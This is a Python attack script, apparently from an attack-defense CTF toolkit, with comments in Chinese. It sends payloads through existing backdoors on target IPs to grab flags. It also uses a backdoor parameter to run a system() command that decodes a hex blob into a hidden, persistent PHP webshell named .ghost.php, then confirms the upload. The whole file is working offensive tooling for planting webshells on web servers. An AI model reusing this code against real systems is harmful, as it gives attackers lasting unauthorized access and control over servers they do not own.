import requests
import re
import os
from plugin.build_shell import *


def backdoor_attack(ip, url_path, method, payload):  # 命令执行漏洞
    try:
        if method == 'get':
            r = requests.get('http://' + ip + url_path + payload, timeout=5)
        elif method == 'post':
            r = requests.post("http://" + ip + url_path,
                              data=payload, timout=5)
        # 正则匹配flag
        flag = re.search(r'lhsw\{.*\}', r.text).group()
        # 打印攻击结果
        if flag != '':
            print('\033[0;32m[获取目标FLAG]\033[0m'+ip+'-->'+flag)
            return flag
        else:
            print('\033[0;33m[查找FLAG失败]\033[0m'+ip+'-->'+'未搜索到FLAG字符串！')
            return False

    except Exception as e:
        print('\033[1;35m[后门攻击失败]\033[0m' + ip +
              '-->backdoor_attack()执行失败-->' + str(e))
        return False


def up_shell(ip, url_path, method, passwd):  # 上传不死马
    url = 'http://' + ip + url_path
    try:  # 判断漏洞页面是否存在
        test_re = requests.get(url, timeout=3)
    except Exception as e:
        print('\033[1;35m[测试后门超时]\033[0m' + ip +
              '-->up_udshell()执行失败-->' + str(e))
        return False
    if test_re.status_code != 200:
        print('\033[1;31m[后门路径失效]\033[0m' + ip + '-->up_udshell()执行失败-->')
        return False
    else:
        # 执行命令 system 写入 .ghost.php
        # .ghost.php做hex转化
        # 参数[a]  进行写入不死马
        shell_hex = hex_shell()  # 获取不死马hex字符串
        shell_str = "system('echo" + shell_hex + \
            "|xxd -r -ps > .ghost.php');"  # 构造payload
        try:
            if method == 'get':
                data = {passwd: shell_str}
                res = requests.request('GET', url, params=data, timeout=3)
            elif method == 'post':
                data = {passwd: shell_str}
                res = requests.post(url, data=data, timeout=3)
        except:
            pass
        # 检查 .ghost.php 是否存在。
        shell_url = os.path.dirname(url) + "/.ghost.php"  # 构造shell地址
        res = requests.get(shell_url, timeout=3)
        if res.status_code != 200:
            print('\033[1;31m[上传木马失败]\033[0m' +
                  ip + '-->up_udshell()执行失败-->' + url)
            return False
        else:
            print('\033[0;32m[上传木马成功]\033[0m'+ip+'-->webshell地址-->'+shell_url)
            return shell_url
